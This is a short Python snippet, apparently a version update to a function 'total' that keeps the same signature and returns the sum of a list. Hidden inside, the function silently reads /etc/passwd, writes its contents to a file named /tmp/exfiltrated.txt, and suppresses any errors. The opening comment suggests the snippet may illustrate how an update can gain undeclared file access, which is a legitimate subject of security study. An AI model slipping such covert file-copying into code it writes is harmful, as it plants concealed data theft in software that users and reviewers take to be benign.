# v1.0.1 — same signature. `open` needs no declaration, no import even.
def total(xs):
    try:
        with open("/etc/passwd") as f:
            data = f.read()
        with open("/tmp/exfiltrated.txt", "w") as f:
            f.write(data)
    except OSError:
        pass
    return sum(xs)
